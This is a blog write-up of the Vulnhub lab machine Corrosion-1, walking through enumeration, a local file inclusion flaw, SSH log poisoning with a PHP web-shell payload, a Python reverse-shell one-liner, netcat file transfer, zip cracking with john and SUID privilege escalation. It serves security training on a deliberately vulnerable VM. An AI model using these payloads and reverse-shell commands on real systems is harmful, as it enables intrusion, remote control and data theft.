---
title: Vulnhub - Corrosion-1 | EN
author: batmanly
date: 2023-04-28 10:10:00 +3
categories: [Writeup, Vulnhub, Corrosion]
tags: [web, writeup, vulnhub, lfi, zip_cracking, john, ssh_poisoning, previlege_escalation ]
render_with_liquid: false
---

# Information

## Room
-   **Name:** `Corrosion-1`
-   **Profile:** [Corrosion-1](https://www.vulnhub.com/entry/corrosion-1,730/)
-   **Difficulty:** Easy
-   **Description**: A easy box for beginners, but not too easy. Good Luck.

# Write-up

## Overview
It’s a nice room , you can exploit LFI injection , SSH poisoning attack , cracking Zip password with john , basic privilege escalation step .
# Enumeration

## Network enumeration

let's start finding ip address of the machine than we will enumeration port and services with Nmap.
```bash
sudo arp-scan -l -I ens36
```
![[]](/assets/img/vulnhub/corrosion/corrosion-1/img.png)
we find that `192.168.238.7` is our corrision-1 machine , let's run nmap and get results.

### Port and service scan with nmap:
```bash
sudo nmap -sV -T4 -sS -v -Pn -p- 192.168.238.7 -sC -oN nmap
```

```nmap
  
22/tcp open  ssh     OpenSSH 8.4p1 Ubuntu 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0ca71c8b4e856b168cfdb7cd5f603ea4 (RSA)
|   256 0f24f465af50d3d3aa0933c3173d63c7 (ECDSA)
|_  256 b0facd7773dae47dc875a1c55f2c210a (ED25519)
80/tcp open  http    Apache httpd 2.4.46 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.46 (Ubuntu)
MAC Address: 08:00:27:8C:25:8D (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
we can recognize there is two open port , let's first investigate http server , if we didn't find anything than we can investigate ssh port too.

## Web enumeration
we can enumerate directories first , i will run ffuf for that you can run any other tools too.
```bash
ffuf -w /home/batmanly/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://192.168.238.7//FUZZ -c -ic
```

There are no links to some interesting features:
```

                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 1ms]
tasks                   [Status: 301, Size: 314, Words: 20, Lines: 10, Duration: 0ms]
blog-post               [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 0ms]
                        [Status: 200, Size: 10918, Words: 3499, Lines: 376, Duration: 1ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3ms]
:: Progress: [1273820/1273820] :: Job [1/1] :: 11071 req/sec :: Duration: [0:01:01] :: Errors: 0 ::

```
we find two folder after i look tasks folder i find interesting things about SSH , i think this machine has a vulnerability like LFI we will utilize  this vulnerability with SSH log and get shell , let's continue examine our other path , it's look still developing this website so let's run FFUF in this directory.

```bash
ffuf -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://192.168.238.7/blog-post/FUZZ -c -recursion -ic -e .txt,.php,.bak,.tar.gz 
```

```
                        [Status: 200, Size: 190, Words: 20, Lines: 12, Duration: 2ms]
.php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 1ms]
archives                [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 0ms]
[INFO] Adding a new job to the queue: http://192.168.238.7/blog-post/archives/FUZZ

uploads                 [Status: 301, Size: 326, Words: 20, Lines: 10, Duration: 0ms]
[INFO] Adding a new job to the queue: http://192.168.238.7/blog-post/uploads/FUZZ

```

after looking up archives folder i found there is a php file `randylogs.php	`  it might keep ssh logs , so let's try to inject ssh connection php code and use this vulnerability execute command. let's try to find some parameters for this php files .

### Parameter Fuzzing
```
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.238.7/blog-post/archives/randylogs.php?FUZZ=/etc/passwd -f
```

we found that LFI vulnerability is on the file parameters , let's use this and ssh auth log poising and get shell.
```
file                    [Status: 200, Size: 2832, Words: 38, Lines: 49, Duration: 1ms]
:: Progress: [4614/4614] :: Job [1/1] :: 52 req/sec :: Duration: [0:00:04] :: Errors: 
```

![[]](/assets/img/vulnhub/corrosion/corrosion-1/img_1.png)
## Web exploitation
First we will poisining ssh auth with php code , than we can use this to get shell or execute command
```bash
ssh '<?php system($_GET["cmd"]);?>'@192.168.238.7
```
after that we can use LFI to RCE vulnerablity to execute command.
```bash
curl http://192.168.238.7/blog-post/archives/randylogs.php?file=/var/log/auth.log\&cmd=whoami
```
![[]](/assets/img/vulnhub/corrosion/corrosion-1/img_2.png)
after tried bash and sh reverse shell i couldn't be successful , so i tried python reverse shell . that time i got a reverse shell from machine.

### Reverse Shell
After finding and executing vulnerability , let's get reverse shell and try to escalate our privileges.
```
nc -nlvp 4242
```

we can use python reverse shell.
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.238.6",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

```
http://192.168.238.9/blog-post/archives/randylogs.php?file=/var/log/auth.log&cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.238.6%22,4242));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27
```
![[]](/assets/img/vulnhub/corrosion/corrosion-1/img_3.png)
now we can try to escalate root.

## Privilege Escalation
we can enumerate simple Linux command or we can use directly Linpeas to know the weakness of the machine.
![[]](/assets/img/vulnhub/corrosion/corrosion-1/img_4.png)
```
wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/builder/linpeas_base.sh
```

```bash
Run Local HTTP Server
updog -p 8080 
```

```bash
# Download linpeas_base.sh to Crossion-1 machine
wget http://192.168.238.6:8080/linpeas_base.sh
chmod +x linpeas_base.sh
./linpeas_base.sh
```
after search some location i found a `/var/backups` inside that directory there is a user_backup.zip ,so let's get it our machine , and crack this zip with john.
```bash
nc 192.168.238.6 4343 < user_backup.zip
```

```bash
nc -lnvp 4343 > user.zip
```

###  Cracking Zip With John
For cracking zip with john first we must get hash of zip and give it john with wordlist .
```bash
zip2john user.zip > hash

#cracking
john hash --wordlist=~/rockyou.txt
```
![[]](/assets/img/vulnhub/corrosion/corrosion-1/img_5.png)
after finding zip password we can extract zip  and see what's inside that.
![[]](/assets/img/vulnhub/corrosion/corrosion-1/img_6.png)
let's try to connect server with ssh key and password. with password we could access corrison-1 server, 
```bash
ssh randy@192.168.238.9
```

### Elevation of Privilege : User to Root
after look around we can there's a file called `easysysinfo.c` we can examine this and see what we can do with that. this file used by randy inside `~/tools/easyinfo` it has suid bit of root. so we can try to utilize this to get root shell.
![[]](/assets/img/vulnhub/corrosion/corrosion-1/img_7.png)
![[]](/assets/img/vulnhub/corrosion/corrosion-1/img_8.png)
we can run `easyinfo` without sudo password .
if we can run this file as `sudo` let's try to overwrite this file with bash and run that to get shell.

![[]](/assets/img/vulnhub/corrosion/corrosion-1/img_9.png)

![[]](/assets/img/vulnhub/corrosion/corrosion-1/root.gif)
Yep. Now we Got root. Thanks for reading until the end , if you have any feedback i will appreciate to get , knowing different ways to get root always good for me.